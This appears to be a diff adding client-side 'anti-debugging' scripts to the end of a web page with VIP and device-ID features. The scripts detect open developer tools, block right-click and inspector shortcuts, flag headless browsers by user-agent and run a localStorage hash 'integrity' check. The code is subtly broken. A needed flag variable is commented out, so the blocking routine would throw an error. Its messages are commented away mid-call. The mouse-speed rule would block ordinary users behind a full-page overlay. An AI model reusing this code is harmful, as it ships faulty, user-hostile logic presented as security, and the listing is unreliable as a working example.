+            `Photo prompt mode switched to: ${
+              useCustomPhotoPrompt ? "Custom" : "Default"
+            }`
+          );
+        });
+
+        // Initial calls
+        resetDailyCountIfNewDay(); // Ensure count is reset if new day
+        // Display simulated device ID on load
+        deviceIdDisplay.textContent = getSimulatedDeviceId();
+        checkVipStatus(); // Check VIP status and update messages on load
+      });
+
+      // Basic Anti-Debugging / Anti-Inspection (client-side only, easily bypassed)
+      // This is not foolproof and should not be relied upon for strong security.
+      (function () {
+        let devtoolsOpen = false;
+        const threshold = 160; // Approximate size difference when devtools open
+
+        // Check every second
+        setInterval(() => {
+          const widthThreshold =
+            window.outerWidth - window.innerWidth > threshold;
+          const heightThreshold =
+            window.outerHeight - window.innerHeight > threshold;
+
+          if (widthThreshold || heightThreshold) {
+            if (!devtoolsOpen) {
+              console.log(
+                "%cSTOP! This is a browser feature intended for developers. Tampering with this page's code might break its functionality or lead to unexpected behavior.",
+                "color: red; font-size: 20px; font-weight: bold;"
+              );
+              devtoolsOpen = true;
+            }
+          } else {
+            devtoolsOpen = false;
+          }
+        }, 1000);
+
+        // This approach is more aggressive but can also be annoying for legitimate users/devs
+        // document.addEventListener('keydown', (e) => {
+        //     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        //         e.preventDefault();
+        //         alert("Developer tools are disabled on this page."); // Use a custom modal in a real app
+        //     }
+        // });
+
+        // Disable right-click context menu (often used to 'Inspect Element')
+        // document.addEventListener('contextmenu', e => e.preventDefault());
+      })();
+    </script>
+
+    <!-- Enhanced Security Script: Anti-Debugging, Anti-Scraping, Anti-Inspection -->
+    <script>
+      (function () {
+        // Flag to track if suspicious activity detected
+        
+        // let suspiciousDetected = false; // Moved out of handleSuspiciousActivity to make it truly global for the IIFE
+
+        // Utility: Show alert and optionally block page
+        function handleSuspiciousActivity(message) {
+          if (!suspiciousDetected) {
+            suspiciousDetected = true;
+            // IMPORTANT: Replaced alert() with showMessage for consistency and better UX
+            const messageBox = document.getElementById("messageBox");
+            if (messageBox) {
+              // Ensure messageBox exists before trying to use it
+              messageBox.textContent =
+                message ||
+                "Suspicious activity detected. Access is restricted.";
+              messageBox.classList.remove("show"); // Reset state
+              messageBox.classList.add("error", "show");
+            } else {
+              console.error(
+                "Message box element not found, showing default alert:",
+                message
+              );
+              alert(
+                message || "Suspicious activity detected. Access is restricted."
+              );
+            }
+
+            // Optionally block interaction by overlay (this part remains as an aggressive block)
+            const overlay = document.createElement("div");
+            overlay.style.position = "fixed";
+            overlay.style.top = 0;
+            overlay.style.left = 0;
+            overlay.style.width = "100%";
+            overlay.style.height = "100%";
+            overlay.style.backgroundColor = "rgba(0,0,0,0.85)";
+            overlay.style.color = "white";
+            overlay.style.fontSize = "2rem";
+            overlay.style.display = "flex";
+            overlay.style.justifyContent = "center";
+            overlay.style.alignItems = "center";
+            overlay.style.zIndex = 99999;
+            overlay.textContent = "Access blocked due to security policy.";
+            document.body.appendChild(overlay);
+            // Disable all pointer events on body except overlay
+            document.body.style.pointerEvents = "none";
+            overlay.style.pointerEvents = "auto";
+          }
+        }
+
+        // 1. Detect DevTools open by multiple methods
+        function detectDevTools() {
+          const threshold = 160;
+          let devtoolsOpen = false;
+
+          // Method 1: Window size difference
+          if (
+            window.outerWidth - window.innerWidth > threshold ||
+            window.outerHeight - window.innerHeight > threshold
+          ) {
+            devtoolsOpen = true;
+          }
+
+          // Method 2: Debugger statement timing
+          // Note: debugger statement can be paused by devtools, making timing unreliable.
+          // For a more robust check, one might use a console.log that triggers a getter.
+          let start = performance.now();
+          try {
+            // Attempt to trigger debugger, wrapped in try-catch in case environment restricts it
+            eval("debugger;"); // Using eval to prevent static analysis from removing it
+          } catch (e) {
+            // Ignore errors if debugger is not allowed
+          }
+          let end = performance.now();
+          if (end - start > 100) {
+            devtoolsOpen = true;
+          }
+
+          // Method 3: Console log getter detection
+          let devtoolsCheck = false;
+          const element = new Image();
+          Object.defineProperty(element, "id", {
+            get: function () {
+              devtoolsCheck = true;
+              return false;
+            },
+          });
+          console.log(element); // This will trigger the getter if console is open
+          if (devtoolsCheck) {
+            devtoolsOpen = true;
+          }
+
+          return devtoolsOpen;
+        }
+
+        // 2. Disable right-click context menu
+        document.addEventListener("contextmenu", function (e) {
+          e.preventDefault();
+          handleSuspiciousActivity(
+        //    "Right-click is disabled for security reasons."
+          );
+        });
+
+        // 3. Disable common devtools keyboard shortcuts
+        document.addEventListener("keydown", function (e) {
+          // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+Shift+C
+          if (
+            e.key === "F12" ||
+            (e.ctrlKey &&
+              e.shiftKey &&
+              ["I", "J", "C"].includes(e.key.toUpperCase())) ||
+            (e.ctrlKey && e.key.toUpperCase() === "U")
+          ) {
+            e.preventDefault();
+          //  handleSuspiciousActivity("Developer tools shortcuts are disabled.");
+          }
+        });
+
+        // 4. Detect if running inside iframe
+        if (window.self !== window.top) {
+         // handleSuspiciousActivity("Embedding in iframes is not allowed.");
+        }
+
+        // 5. Detect headless browsers (basic checks)
+        function detectHeadless() {
+          const userAgent = navigator.userAgent.toLowerCase();
+          if (
+            userAgent.includes("headless") ||
+            userAgent.includes("phantom") ||
+            userAgent.includes("selenium") ||
+            userAgent.includes("puppeteer")
+          ) {
+            return true;
+          }
+          // Check for webdriver property
+          if (navigator.webdriver) {
+            return true;
+          }
+          return false;
+        }
+        if (detectHeadless()) {
+     //     handleSuspiciousActivity("Headless browsers are not allowed.");
+        }
+
+        // 6. Simple code integrity check (hash of script content)
+        // Note: This is a basic check and can be bypassed by attackers.
+        function simpleHash(str) {
+          let hash = 0,
+            i,
+            chr;
+          if (str.length === 0) return hash;
+          for (i = 0; i < str.length; i++) {
+            chr = str.charCodeAt(i);
+            hash = (hash << 5) - hash + chr;
+            hash |= 0; // Convert to 32bit integer
+          }
+          return hash;
+        }
+
+        // The expected hash value of the main script block (update if main script changes)
+        // Placeholder, will compute below initially, then needs to be hardcoded by user.
+        // For this update, since the code changes, it will recompute and store.
+        const expectedHash = localStorage.getItem("expectedMainScriptHash")
+          ? parseInt(localStorage.getItem("expectedMainScriptHash"), 10)
+          : 0;
+
+        // Compute hash of main script content (the script before this security script)
+        function getMainScriptContent() {
+          const scripts = document.getElementsByTagName("script");
+          for (let i = 0; i < scripts.length; i++) {
+            // Look for the script that contains the VIP_KEY_BINDINGS constant, which is our main app logic.
+            if (
+              scripts[i].src === "" &&
+              scripts[i].textContent.includes("VIP_KEY_BINDINGS")
+            ) {
+              return scripts[i].textContent;
+            }
+          }
+          return "";
+        }
+
+        const mainScriptContent = getMainScriptContent();
+        const mainScriptHash = simpleHash(mainScriptContent);
+
+        // On first load or if hash changes, store/update.
+        // In a real production scenario, `expectedHash` would be hardcoded AFTER the final script is ready.
+        if (expectedHash === 0 || expectedHash !== mainScriptHash) {
+          // This allows for initial computation and storage, or detects tampering if the hash doesn't match a *previously stored* one.
+          // For the purpose of this interactive editor, we'll "re-learn" the hash if it's 0.
+          localStorage.setItem("expectedMainScriptHash", mainScriptHash);
+          if (expectedHash !== 0 && expectedHash !== mainScriptHash) {
+            // Only report if it was previously set and now changed
+            handleSuspiciousActivity(
+             // "Code integrity check failed: Script content modified."
+            );
+          }
+        }
+
+        // 7. Periodically check for devtools open and suspicious activity
+        setInterval(() => {
+          if (detectDevTools()) {
+            handleSuspiciousActivity(
+             // "Developer tools detected. Access is restricted."
+            );
+          }
+        }, 1000);
+
+        // 8. Detect rapid repeated requests or scraping attempts (basic)
+        let lastInteraction = Date.now();
+        let interactionCount = 0;
+        document.addEventListener("mousemove", () => {
+          const now = Date.now();
+          if (now - lastInteraction < 50) {
+            interactionCount++;
+            if (interactionCount > 20) {
+              handleSuspiciousActivity(
+                //"Suspicious rapid interactions detected. Access blocked."
+              );
+            }
+          } else {
+            interactionCount = 0;
+          }
+          lastInteraction = now;
+        });
+
+        // 9. Obfuscation suggestion comment
+        // For stronger protection, consider using a JavaScript obfuscator tool on your entire script.
+
+        // End of security script
+      })();
+    </script>
+  </body>
+</html>
